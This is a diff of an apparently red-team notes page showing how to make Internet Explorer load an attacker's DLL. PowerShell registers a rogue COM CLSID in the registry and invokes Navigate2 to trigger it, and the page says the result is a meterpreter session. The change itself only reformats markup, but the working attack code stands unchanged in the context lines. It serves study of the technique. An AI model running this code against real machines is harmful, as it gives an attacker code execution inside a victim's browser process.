@@ -18,8 +18,7 @@ See [https://labs.nettitude.com/blog/com-and-the-powerthief/](https://labs.netti
 
 Below is a powershell code that creates a new COM object with a randomly chosen CLSID `55555555-5555-5555-5555-555555555555` which registers our malicious DLL at `\\VBOXSVR\Experiments\evilm64.dll` to handle incoming calls from COM clients:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 # Code borrowed from https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1 by Rob Maslen
 $CLSID = "55555555-5555-5555-5555-555555555555"
@@ -37,8 +36,7 @@ New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -N
 New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
 New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Once run, we can see that the new COM object got created successfully in the registry:
 
@@ -50,8 +48,7 @@ We are now ready to execute the payload with the below powershell. What happens 
 * Specifically, we are interested in getting an instance of a COM object for iexplore.exe, because its COM server has a method `Navigate2(...)` exposed. The `Navigate2` allows us to programatically instruct the iexplore.exe to navigate to a URL. 
 * We are asking iexplore to navigate to our newly created malicious CLSID pointing to our DLL instead of a URL:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 # force iexplore to load the malicious DLL and execute it
 $shellWinGuid = [System.Guid]::Parse("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
@@ -59,8 +56,7 @@ $typeShwin = [System.Type]::GetTypeFromCLSID($shellWinGuid)
 $shwin = [System.Activator]::CreateInstance($typeShwin) | ? {$_.fullname -match 'iexplore'} | Select-Object -First 1
 $shWin.Navigate2("shell:::{$CLSID}", 2048)
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Code execution in action, resulting in a meterpreter session:
 
